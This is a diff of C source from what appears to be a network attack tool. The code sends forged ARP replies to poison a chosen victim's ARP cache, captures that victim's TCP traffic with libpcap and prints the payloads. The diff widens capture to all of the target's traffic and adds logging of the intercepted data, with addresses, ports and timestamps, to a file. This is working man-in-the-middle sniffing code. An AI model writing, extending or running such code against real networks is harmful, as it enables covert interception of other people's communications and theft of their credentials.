@@ -7,7 +7,7 @@
 #include "../others/networking.h"
 #include "../others/libpcap.h"
 
-char *ipToCheat=NULL;
+char *ipToCheat=NULL,*logFilePath=NULL;
 u_char macBroadcastToCheat[6]={0};
 long unsigned int delay=SNIFFING_THREAD_DELAY_US;
 int numHosts=0;
@@ -21,7 +21,8 @@ static void sending_arp_sniffing_packets(){
 	char errbuf[BUFFER_SIZE_128B]="";
 	libnet_t *libnetHandle=libnet_init(LIBNET_LINK,networkInfo.interfaceName,errbuf);
 	while(!cancelCurrentProcess){
-		libnet_build_arp(1,0x0800,6,4,ARP_REPLY,(u_char *) networkInfo.interfaceMacHex,(u_char *) &srcIP,(u_char *)macBroadcastToCheat,(u_char *) &dstIP,NULL,0,libnetHandle,0);
+		libnet_build_arp(1,0x0800,6,4,ARP_REPLY,(u_char *) networkInfo.interfaceMacHex,(u_char *) &srcIP,
+				(u_char *)macBroadcastToCheat,(u_char *) &dstIP,NULL,0,libnetHandle,0);
 		libnet_build_ethernet((u_char *)macBroadcastToCheat,(u_char *) networkInfo.interfaceMacHex,0x0806,NULL,0,libnetHandle,0);
 		if(libnet_write(libnetHandle)==-1) show_message(libnet_geterror(libnetHandle),0, 0, ERROR_MESSAGE,TRUE);
 		usleep(delay);
@@ -37,29 +38,47 @@ static void * start_sending_arp_sniffing_packets(void *ptr){
 
 static void process_sniffed_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
 	static int count = 1;
-	const struct sniff_ip *ip;
-	const struct sniff_tcp *tcp;
+	const struct sniffIp *ip;
+	const struct sniffTcp *tcp;
 	const u_char *payload;
 	int sizeIp, sizeTcp, sizePayload;
 	count++;
-	ip=(struct sniff_ip*)(packet+SIZE_ETHERNET);
+	ip=(struct sniffIp*)(packet+SIZE_ETHERNET);
 	sizeIp=IP_HL(ip)*4;
-	tcp=(struct sniff_tcp*)(packet + SIZE_ETHERNET + sizeIp);
+	tcp=(struct sniffTcp*)(packet + SIZE_ETHERNET + sizeIp);
 	sizeTcp=TH_OFF(tcp)*4;
 	switch(ip->ip_p) {
 	case IPPROTO_TCP:
 		payload=(u_char *)(packet+SIZE_ETHERNET+sizeIp+sizeTcp);
 		sizePayload=ntohs(ip->ip_len)-(sizeIp+sizeTcp);
-		if(sizePayload>0) {
+		if(sizePayload>1) {
 			printf("\n                 From: %s\n",inet_ntoa(ip->ip_src));
 			printf("                   To: %s\n",inet_ntoa(ip->ip_dst));
 			printf("            Src. port: %d\n",ntohs(tcp->th_sport));
 			printf("            Dst. port: %d\n",ntohs(tcp->th_dport));
+			printf("                   ID: %d\n",ntohs(ip->ip_id));
 			printf("  Payload (%d bytes): ",sizePayload);
 			const u_char *ch=payload;
 			printf("%s",C_HWHITE);
 			for(int i=0;i<sizePayload;i++,ch++) (isprint(*ch) || (*ch=='\n'))?(printf("%c", *ch)):(printf("·"));
 			printf("%s\n",C_DEFAULT);
+			if(strcmp(logFilePath,"")!=0){
+				time_t timestamp = time(NULL);
+				struct tm tm = *localtime(&timestamp);
+				char d[50]="", t[50]="", u[50]="";
+				snprintf(d,sizeof(d),"%d/%02d/%02d",tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday);
+				snprintf(t,sizeof(t),"%02d:%02d:%02d",tm.tm_hour, tm.tm_min, tm.tm_sec);
+				snprintf(u,sizeof(u),"%s",tm.tm_zone);
+				FILE *f=fopen(logFilePath,"a");
+				u_char *buf=malloc(sizePayload+1);
+				memset(buf,0,sizePayload+1);
+				ch=payload;
+				for(int i=0;i<sizePayload;i++,ch++) (isprint(*ch) || (*ch=='\n'))?(buf[i]=*ch):(buf[i]=' ');
+				fprintf(f,"%d\t\"%s\"\t\"%s\"\t%d\t%d\t\"%s\"\t\"%s\"\t\"%s\"\t\"%s\"\n",ntohs(ip->ip_id),
+						inet_ntoa(ip->ip_src),inet_ntoa(ip->ip_dst),ntohs(tcp->th_sport),ntohs(tcp->th_dport),buf,d,t,u);
+				fclose(f);
+				free(buf);
+			}
 			return;
 		}
 		break;
@@ -119,7 +138,6 @@ static void process_get_mac_arp_packet(u_char *args, const struct pcap_pkthdr *h
 	arphdr_t *arpheader=(struct arphdr *)(packet+14);
 	char ip[20]="";
 	snprintf(ip, sizeof(ip),"%d.%d.%d.%d", arpheader->spa[0], arpheader->spa[1], arpheader->spa[2], arpheader->spa[3]);
-	//sprintf(macBroadcastToCheat,"%02X:%02X:%02X:%02X:%02X:%02X",arpheader->sha[0], arpheader->sha[1], arpheader->sha[2],arpheader->sha[3], arpheader->sha[4], arpheader->sha[5]);
 	for(int i=0;i<6;i++) macBroadcastToCheat[i]=arpheader->sha[i];
 	return;
 }
@@ -152,18 +170,18 @@ int arp(int type){
 					continue;
 				}
 				arp(OTHERS_ARP_DISCOVER_MAC);
-				free(ipToCheat);
 				if(strcmp((char *) macBroadcastToCheat,"")==0){
 					show_message("  IP no found into the network...\n",0, 0, ERROR_MESSAGE, FALSE);
+					free(ipToCheat);
 					PRINT_RESET;
 					return RETURN_OK;
 				}
 				break;
 			}
 		}while(TRUE);
-		printf("  MAC found: %02X:%02X:%02X:%02X:%02X:%02X\n", macBroadcastToCheat[0],macBroadcastToCheat[1], macBroadcastToCheat[2],
+		printf("\n  MAC found: %02X:%02X:%02X:%02X:%02X:%02X\n", macBroadcastToCheat[0],macBroadcastToCheat[1], macBroadcastToCheat[2],
 				macBroadcastToCheat[3],macBroadcastToCheat[4], macBroadcastToCheat[5]);
-		char *userDelay=get_readline("\n  Insert thread sending packet delay in ms (default and recommended value: 350000): ", FALSE);
+		char *userDelay=get_readline("\n  Insert thread sending packet delay in us -default value: 10000000 (10\")-: ", FALSE);
 		if(strcmp(userDelay, "")!=0){
 			char *endPtr=NULL;
 			delay=strtol(userDelay,&endPtr,10);
@@ -173,14 +191,39 @@ int arp(int type){
 			}
 		}
 		free(userDelay);
-		snprintf(pcapFilter, BUFFER_SIZE_128B, "host %s and port %d", target.strTargetIp, portUnderHacking);
-		if(pcap_compile(arpHandle,&fp,pcapFilter,0,networkInfo.net)==-1) return show_message("Error parsing filter",0, 0, ERROR_MESSAGE, TRUE);
-		if(pcap_setfilter(arpHandle,&fp)==-1) return show_message("Error installing filter",0, 0, ERROR_MESSAGE, TRUE);
+		do{
+			logFilePath=get_readline("\n  Insert log file path -empty no logging-: ", FALSE);
+			if(strcmp(logFilePath,"")==0) break;
+			FILE *f=NULL;
+			if((f=fopen(logFilePath, "a"))==NULL){
+				show_message("Cannot write in the specified location.", 0, 0, ERROR_MESSAGE, TRUE);
+				continue;
+			}
+			fclose(f);
+			break;
+		}while(TRUE);
+		//snprintf(pcapFilter, BUFFER_SIZE_128B, "host %s and port %d", target.strTargetIp, portUnderHacking);
+		snprintf(pcapFilter, BUFFER_SIZE_128B, "host %s", target.strTargetIp);
+		if(pcap_compile(arpHandle,&fp,pcapFilter,0,networkInfo.net)==-1){
+			pcap_close(arpHandle);
+			pcap_freecode(&fp);
+			return show_message("Error parsing filter",0, 0, ERROR_MESSAGE, TRUE);
+		}
+		if(pcap_setfilter(arpHandle,&fp)==-1){
+			pcap_close(arpHandle);
+			pcap_freecode(&fp);
+			return show_message("Error installing filter",0, 0, ERROR_MESSAGE, TRUE);
+		}
 		pthread_t sendingArpSpoofedPacketsThread;
 		printf("\n  Sniffing started...\n");
-		if(pthread_create(&sendingArpSpoofedPacketsThread,NULL,&start_sending_arp_sniffing_packets,NULL)<0) return THREAD_CREATION_ERROR;
+		if(pthread_create(&sendingArpSpoofedPacketsThread,NULL,&start_sending_arp_sniffing_packets,NULL)<0){
+			pcap_close(arpHandle);
+			pcap_freecode(&fp);
+			return THREAD_CREATION_ERROR;
+		}
 		pcap_loop(arpHandle, -1, process_sniffed_packet, NULL);
 		pcap_close(arpHandle);
+		pcap_freecode(&fp);
 		pthread_cancel(sendingArpSpoofedPacketsThread);
 		pthread_join(sendingArpSpoofedPacketsThread, NULL);
 		printf("\n  Sniffing finished.");
@@ -192,7 +235,11 @@ int arp(int type){
 		if(pcap_setfilter(arpHandle,&fp)==-1) printf("Error installing filter");
 		numHosts=~ntohl(networkInfo.mask) & 0xffffffff;
 		pthread_t sendArpDiscoverPacketsThread;
-		if(pthread_create(&sendArpDiscoverPacketsThread,NULL,&start_send_arp_discover_packets_thread,NULL)<0) return THREAD_CREATION_ERROR;
+		if(pthread_create(&sendArpDiscoverPacketsThread,NULL,&start_send_arp_discover_packets_thread,NULL)<0){
+			pcap_close(arpHandle);
+			pcap_freecode(&fp);
+			return THREAD_CREATION_ERROR;
+		}
 		if(type==OTHERS_ARP_DISCOVER_D){
 			printf("\nNumber of hosts supported by the network: %s%d%s\n\n", C_HWHITE, numHosts, C_DEFAULT);
 			printf("Hosts discovered: \n");
